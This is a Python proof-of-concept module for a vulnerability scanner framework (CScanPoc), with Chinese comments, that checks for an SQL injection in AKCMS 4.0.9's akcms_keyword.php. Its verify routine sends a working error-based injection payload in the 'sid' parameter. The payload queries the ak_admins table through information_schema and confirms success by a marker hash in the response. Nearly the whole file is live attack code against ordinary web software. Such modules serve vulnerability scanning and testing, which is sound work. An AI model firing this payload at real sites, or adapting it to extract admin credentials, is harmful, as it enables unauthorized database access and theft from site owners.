# coding: utf-8
from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'AKCMS_0001_p'  # 平台漏洞编号，留空
    name = 'AKCMS 4.0.9 SQL注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2012-05-06'  # 漏洞公布时间
    desc = '''
        AKCMS是国内最著名的轻量级CMS建站程序，在主流PHP建站系统中特色鲜明，以灵活、小巧、兼容性好、负载强等优点而深受许多站长的喜爱。
        漏洞出现在：akcms_keyword.php 中，参数未过滤导致注入。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/102/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'AKCMS'  # 漏洞应用名称
    product_version = '4.0.9'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'aba8b963-28dd-49c4-b319-f62b28bb613e'  # 平台 POC 编号，留空
    author = '47bwy'  # POC编写者
    create_date = '2018-06-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # payloa根据实际环境确定
            payload = '/akcms4.0.9/akcms_keyword.php'
            data = """?sid=11111'and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,md5(c),0x27,0x7e) from ak_admins limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)and '1'='1&keyword=11"""
            url = self.target + payload + data
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
